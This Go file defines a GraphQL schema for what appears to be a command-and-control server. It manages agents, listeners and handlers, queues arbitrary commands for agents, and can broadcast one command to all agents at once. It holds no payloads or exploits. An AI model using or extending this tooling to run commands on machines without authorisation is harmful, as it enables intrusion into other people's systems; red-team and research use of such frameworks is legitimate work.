package main

import (
	"fmt"
	"time"

	"github.com/graphql-go/graphql"
)

func createSchema() (graphql.Schema, error) {
	agentType := graphql.NewObject(graphql.ObjectConfig{
		Name: "Agent",
		Fields: graphql.Fields{
			"id": &graphql.Field{
				Type: graphql.String,
			},
			"name": &graphql.Field{
				Type: graphql.String,
			},
			"status": &graphql.Field{
				Type: graphql.String,
			},
			"ip": &graphql.Field{
				Type: graphql.String,
			},
			"lastSeen": &graphql.Field{
				Type: graphql.String,
			},
			"os": &graphql.Field{
				Type: graphql.String,
			},
			"handlerId": &graphql.Field{
				Type: graphql.String,
			},
			"handlerName": &graphql.Field{
				Type: graphql.String,
			},
			"reconnectInterval": &graphql.Field{
				Type: graphql.Int,
			},
			"createdAt": &graphql.Field{
				Type: graphql.String,
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					switch v := p.Source.(type) {
					case Agent:
						return v.CreatedAt.Format(time.RFC3339), nil
					case *Agent:
						if v == nil {
							return nil, nil
						}
						return v.CreatedAt.Format(time.RFC3339), nil
					default:
						return nil, nil
					}
				},
			},
		},
	})

	commandType := graphql.NewObject(graphql.ObjectConfig{
		Name: "Command",
		Fields: graphql.Fields{
			"id": &graphql.Field{
				Type: graphql.Int,
			},
			"agentId": &graphql.Field{
				Type: graphql.String,
			},
			"command": &graphql.Field{
				Type: graphql.String,
			},
			"clientUsername": &graphql.Field{
				Type: graphql.String,
			},
			"status": &graphql.Field{
				Type: graphql.String,
			},
			"output": &graphql.Field{
				Type: graphql.String,
			},
			"createdAt": &graphql.Field{
				Type: graphql.String,
			},
			"executedAt": &graphql.Field{
				Type: graphql.String,
			},
		},
	})

	agentContextType := graphql.NewObject(graphql.ObjectConfig{
		Name: "AgentContext",
		Fields: graphql.Fields{
			"agent": &graphql.Field{
				Type: agentType,
			},
			"commands": &graphql.Field{
				Type: graphql.NewList(commandType),
			},
		},
	})

	listenerType := graphql.NewObject(graphql.ObjectConfig{
		Name: "Listener",
		Fields: graphql.Fields{
			"id": &graphql.Field{
				Type: graphql.String,
			},
			"name": &graphql.Field{
				Type: graphql.String,
			},
			"type": &graphql.Field{
				Type: graphql.String,
			},
			"endpoint": &graphql.Field{
				Type: graphql.String,
			},
			"status": &graphql.Field{
				Type: graphql.String,
			},
			"description": &graphql.Field{
				Type: graphql.String,
			},
			"createdAt": &graphql.Field{
				Type: graphql.String,
			},
		},
	})

	handlerType := graphql.NewObject(graphql.ObjectConfig{
		Name: "AgentHandler",
		Fields: graphql.Fields{
			"id": &graphql.Field{
				Type: graphql.String,
			},
			"agentName": &graphql.Field{
				Type: graphql.String,
			},
			"agentHttpHeaderId": &graphql.Field{
				Type: graphql.String,
			},
		"supportedCommands": &graphql.Field{
			Type: graphql.NewList(graphql.String),
		},
	},
})

	userType := graphql.NewObject(graphql.ObjectConfig{
		Name: "User",
		Fields: graphql.Fields{
			"id": &graphql.Field{
				Type: graphql.String,
			},
			"username": &graphql.Field{
				Type: graphql.String,
			},
			"created_at": &graphql.Field{
				Type: graphql.String,
			},
		},
	})

	logType := graphql.NewObject(graphql.ObjectConfig{
		Name: "Log",
		Fields: graphql.Fields{
			"id": &graphql.Field{
				Type: graphql.String,
			},
			"timestamp": &graphql.Field{
				Type: graphql.String,
			},
			"level": &graphql.Field{
				Type: graphql.String,
			},
			"message": &graphql.Field{
				Type: graphql.String,
			},
			"source": &graphql.Field{
				Type: graphql.String,
			},
		},
	})

	queryType := graphql.NewObject(graphql.ObjectConfig{
		Name: "Query",
		Fields: graphql.Fields{
			"agents": &graphql.Field{
				Type: graphql.NewList(agentType),
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					return getAllAgents()
				},
			},
			"agentHandlers": &graphql.Field{
				Type: graphql.NewList(handlerType),
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					return getAllAgentHandlers()
				},
			},
			"commands": &graphql.Field{
				Type: graphql.NewList(commandType),
				Args: graphql.FieldConfigArgument{
					"agentId": &graphql.ArgumentConfig{
						Type: graphql.String,
					},
					"status": &graphql.ArgumentConfig{
						Type: graphql.String,
					},
					"limit": &graphql.ArgumentConfig{
						Type: graphql.Int,
					},
					"offset": &graphql.ArgumentConfig{
						Type: graphql.Int,
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					agentID, _ := p.Args["agentId"].(string)
					status, _ := p.Args["status"].(string)
					limit, limitOk := p.Args["limit"].(int)
					offset, offsetOk := p.Args["offset"].(int)

					if agentID == "" {
						return nil, fmt.Errorf("agentId is required")
					}

					// Use pagination if limit is provided
					if limitOk {
						if !offsetOk {
							offset = 0
						}
						commands, err := getCommandsForAgentPaginated(agentID, limit, offset)
						if err != nil {
							return nil, err
						}

						// Filter by status if provided
						if status != "" {
							var filtered []Command
							for _, cmd := range commands {
								if cmd.Status == status {
									filtered = append(filtered, cmd)
								}
							}
							return filtered, nil
						}

						return commands, nil
					}

					// Legacy: Get all commands
					commands, err := getCommandsForAgent(agentID)
					if err != nil {
						return nil, err
					}

					// Filter by status if provided
					if status != "" {
						var filtered []Command
						for _, cmd := range commands {
							if cmd.Status == status {
								filtered = append(filtered, cmd)
							}
						}
						return filtered, nil
					}

					return commands, nil
				},
			},
			"commandCount": &graphql.Field{
				Type: graphql.Int,
				Args: graphql.FieldConfigArgument{
					"agentId": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					agentID, _ := p.Args["agentId"].(string)
					if agentID == "" {
						return 0, fmt.Errorf("agentId is required")
					}

					count, err := getCommandCountForAgent(agentID)
					if err != nil {
						return 0, err
					}

					return count, nil
				},
			},
			"listeners": &graphql.Field{
				Type: graphql.NewList(listenerType),
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					return getAllListeners()
				},
			},
			"users": &graphql.Field{
				Type: graphql.NewList(userType),
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					return getAllUsers()
				},
			},
			"logs": &graphql.Field{
				Type: graphql.NewList(logType),
				Args: graphql.FieldConfigArgument{
					"limit": &graphql.ArgumentConfig{
						Type: graphql.Int,
					},
					"offset": &graphql.ArgumentConfig{
						Type: graphql.Int,
					},
					"search": &graphql.ArgumentConfig{
						Type: graphql.String,
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					limit := 50
					offset := 0
					search := ""

					if l, ok := p.Args["limit"].(int); ok {
						limit = l
					}
					if o, ok := p.Args["offset"].(int); ok {
						offset = o
					}
					if s, ok := p.Args["search"].(string); ok {
						search = s
					}

					// If searching, ignore pagination and return all matching logs
					if search != "" {
						return searchLogs(search)
					}

					return getLogsPaginated(limit, offset)
				},
			},
			"logsCount": &graphql.Field{
				Type: graphql.Int,
				Args: graphql.FieldConfigArgument{
					"search": &graphql.ArgumentConfig{
						Type: graphql.String,
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					search := ""
					if s, ok := p.Args["search"].(string); ok {
						search = s
					}

					if search != "" {
						return getLogsCountSearch(search)
					}

					return getLogsCount()
				},
			},
			"globalCommands": &graphql.Field{
				Type: graphql.NewList(graphql.NewObject(graphql.ObjectConfig{
					Name: "GlobalCommand",
					Fields: graphql.Fields{
						"command": &graphql.Field{
							Type: graphql.String,
						},
						"clientUsername": &graphql.Field{
							Type: graphql.String,
						},
						"createdAt": &graphql.Field{
							Type: graphql.String,
						},
						"agentCount": &graphql.Field{
							Type: graphql.Int,
						},
						"agentIds": &graphql.Field{
							Type: graphql.String,
						},
						"statuses": &graphql.Field{
							Type: graphql.String,
						},
					},
				})),
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					return getGlobalCommands()
				},
			},
			"agentContext": &graphql.Field{
				Type: agentContextType,
				Args: graphql.FieldConfigArgument{
					"agentId": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					agentID, _ := p.Args["agentId"].(string)
					if agentID == "" {
						return nil, fmt.Errorf("agentId is required")
					}

					agent, err := getAgentByID(agentID)
					if err != nil {
						return nil, err
					}
					if agent == nil {
						return nil, nil
					}

					commands, err := getCommandsForAgent(agentID)
					if err != nil {
						return nil, err
					}

					return map[string]interface{}{
						"agent":    agent,
						"commands": commands,
					}, nil
				},
			},
		},
	})

	mutationType := graphql.NewObject(graphql.ObjectConfig{
		Name: "Mutation",
		Fields: graphql.Fields{
			"createListener": &graphql.Field{
				Type: listenerType,
				Args: graphql.FieldConfigArgument{
					"name": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
					"endpoint": &graphql.ArgumentConfig{
						Type: graphql.String,
					},
					"description": &graphql.ArgumentConfig{
						Type: graphql.String,
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					name, _ := p.Args["name"].(string)
					endpoint, _ := p.Args["endpoint"].(string)
					description, _ := p.Args["description"].(string)

				listener, err := createListener(name, endpoint, description)
					if err != nil {
						return nil, err
					}

					broadcastListeners()
					return listener, nil
				},
			},
			"startListener": &graphql.Field{
				Type: listenerType,
				Args: graphql.FieldConfigArgument{
					"id": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					id, _ := p.Args["id"].(string)
					listener, err := startListener(id)
					if err != nil {
						return nil, err
					}

					broadcastListeners()
					return listener, nil
				},
			},
			"stopListener": &graphql.Field{
				Type: listenerType,
				Args: graphql.FieldConfigArgument{
					"id": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					id, _ := p.Args["id"].(string)
					listener, err := stopListener(id)
					if err != nil {
						return nil, err
					}

					broadcastListeners()
					return listener, nil
				},
			},
			"deleteListener": &graphql.Field{
				Type: graphql.Boolean,
				Args: graphql.FieldConfigArgument{
					"id": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					id, _ := p.Args["id"].(string)
					deleted, err := deleteListener(id)
					if err != nil {
						return false, err
					}

					broadcastListeners()
					return deleted, nil
				},
			},
			"upsertAgentHandler": &graphql.Field{
				Type: handlerType,
				Args: graphql.FieldConfigArgument{
					"config": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					config, _ := p.Args["config"].(string)
					handler, _, err := upsertAgentHandlerFromJSON(config)
					if err != nil {
						return nil, err
					}

					broadcastHandlers()
					return handler, nil
				},
			},
			"deleteAgentHandler": &graphql.Field{
				Type: graphql.Boolean,
				Args: graphql.FieldConfigArgument{
					"id": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					id, _ := p.Args["id"].(string)
					if id == "" {
						return false, fmt.Errorf("id is required")
					}

					if _, exists := agentHandlers[id]; !exists {
						return false, nil
					}

					if err := deleteAgentHandlerConfig(id); err != nil {
						return false, err
					}

					broadcastHandlers()
					return true, nil
				},
			},
			"createUser": &graphql.Field{
				Type: userType,
				Args: graphql.FieldConfigArgument{
					"username": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
					"password": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
					"registrationKey": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					username, _ := p.Args["username"].(string)
					password, _ := p.Args["password"].(string)
					registrationKey, _ := p.Args["registrationKey"].(string)
					return createUser(username, password, registrationKey)
				},
			},
			"revokeUser": &graphql.Field{
				Type: graphql.NewObject(graphql.ObjectConfig{
					Name: "RevokeResult",
					Fields: graphql.Fields{
						"success": &graphql.Field{
							Type: graphql.Boolean,
						},
					},
				}),
				Args: graphql.FieldConfigArgument{
					"userId": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
					"registrationKey": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					userID, _ := p.Args["userId"].(string)
					registrationKey, _ := p.Args["registrationKey"].(string)
					return revokeUser(userID, registrationKey)
				},
			},
			"sendGlobalCommand": &graphql.Field{
				Type: graphql.NewObject(graphql.ObjectConfig{
					Name: "GlobalCommandResult",
					Fields: graphql.Fields{
						"success": &graphql.Field{
							Type: graphql.Boolean,
						},
						"message": &graphql.Field{
							Type: graphql.String,
						},
						"agentCount": &graphql.Field{
							Type: graphql.Int,
						},
					},
				}),
				Args: graphql.FieldConfigArgument{
					"command": &graphql.ArgumentConfig{
						Type: graphql.NewNonNull(graphql.String),
					},
					"username": &graphql.ArgumentConfig{
						Type: graphql.String,
					},
				},
				Resolve: func(p graphql.ResolveParams) (interface{}, error) {
					command, _ := p.Args["command"].(string)
					username, _ := p.Args["username"].(string)
					if username == "" {
						username = "reaper"
					}

					// Get all agents
					agents, err := getAllAgents()
					if err != nil {
						return map[string]interface{}{
							"success":    false,
							"message":    "Failed to get agents",
							"agentCount": 0,
						}, nil
					}

					if len(agents) == 0 {
						return map[string]interface{}{
							"success":    false,
							"message":    "No agents available",
							"agentCount": 0,
						}, nil
					}

					// Queue command for each agent (regardless of status)
					var queuedAgents []string
					now := time.Now()

					for _, agent := range agents {
						_, err := db.Exec("INSERT INTO commands (agent_id, command, client_username, status, created_at) VALUES (?, ?, ?, ?, ?)",
							agent.ID, command, username, "pending", now)
						if err != nil {
							continue
						}

						// Log the command
						logCommand(username, agent.ID, command)

						// Broadcast command update
						broadcastCommandUpdate(agent.ID)

						queuedAgents = append(queuedAgents, agent.ID)
					}

					return map[string]interface{}{
						"success":    true,
						"message":    fmt.Sprintf("Global command queued for %d agents", len(queuedAgents)),
						"agentCount": len(queuedAgents),
					}, nil
				},
			},
		},
	})

	return graphql.NewSchema(graphql.SchemaConfig{
		Query:    queryType,
		Mutation: mutationType,
	})
}
